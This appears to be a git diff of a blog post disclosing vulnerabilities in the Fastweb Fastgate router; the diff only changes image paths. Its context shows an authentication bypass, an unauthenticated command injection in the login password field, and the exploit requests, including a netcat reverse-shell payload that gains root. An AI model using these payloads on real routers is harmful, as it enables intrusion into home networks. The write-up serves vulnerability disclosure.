@@ -20,7 +20,7 @@ Working as a penetration tester, and having the possibility to test it out, I st
 First step was to set up Burp Suite as a proxy and navigate a bit through the webpages to save some requests and responses.
 The first screen I got was the login panel, as shown in figure 1.
 
-{% include image.html url="img/fastgate/login.png" description="Figure 1 - Login panel" %}
+{% include image.html url="assets/img/fastgate/login.png" description="Figure 1 - Login panel" %}
 
 ### Broken authentication layer
 I logged in and started to browse some pages and execute actions in order to understand how requests were handled. The first thing I noticed was that the login request did not return any cookie nor any token to the client and this made me suspicious: did they implement some authentication at all? \
@@ -33,7 +33,7 @@ GET http://192.168.1.254/status.cgi?nvget=pc_list
 ```
 Just to have a nice output to show, I developed a python script that parses the JSON response and displays it:
 
-{% include image.html url="img/fastgate/userenum.png" description="Figure 2 - Devices enumeration" %}
+{% include image.html url="assets/img/fastgate/userenum.png" description="Figure 2 - Devices enumeration" %}
 
 ### Unauthenticated command injection in login page
 With this trivial _authentication bypass_ via the `status.cgi` binary, I went back to the login request and started to manually fuzz both the username and password fields. After a few tests I noticed that the response of the server, after putting a single quotation mark into the password field, printed an interesting line:
@@ -49,7 +49,7 @@ I wanted to see if I could actually run some commands, so I tried executing `pin
 GET /status.cgi?_=1512070412178&cmd=3&nvget=login_confirm&password='$(ping)'&remember_me=1&username=admin HTTP/1.1
 ```
 The response was the confirmation I was looking for:
-{% include image.html url="img/fastgate/ping.png" description="Figure 3 - Ping command" %}
+{% include image.html url="assets/img/fastgate/ping.png" description="Figure 3 - Ping command" %}
 
 
 As shown, I can successfully send arbitrary commands by adding to the password input the text ```'$(`command`)'```.
@@ -63,14 +63,14 @@ GET /status.cgi?cmd=3&nvget=login_confirm&password=AA'$(`/statusapi/usr/bin/nc%2
 ```
 This was enough to get a full reverse shell into the system, and guess what? The process is running as `root` so we get full access to the device. 
 
-{% include image.html url="img/fastgate/poc.png" description="Figure 4 - Exploit executed to get a shell" %}
+{% include image.html url="assets/img/fastgate/poc.png" description="Figure 4 - Exploit executed to get a shell" %}
 
 
 ## Conclusions
 For documentation purpose, the vulnerable software version that I tested is the `v1.0.1b`, with firmware version `0.00.47_FW_200_Askey2017-05-17 17:31:59`.\
 It must be noted that in order to exploit the vulnerability the attacker must be authenticated to the Wi-Fi network, as the admin interface is exposed on the internal network.
 
-{% include image.html url="img/fastgate/version.png" description="Figure 5 - Vulnerable version" %}
+{% include image.html url="assets/img/fastgate/version.png" description="Figure 5 - Vulnerable version" %}
 
 
 The communication with Fastweb didn't go very smooth. I tried to contact them multiple times to report this vulnerability but after an initial ack they stopped any communication with me.
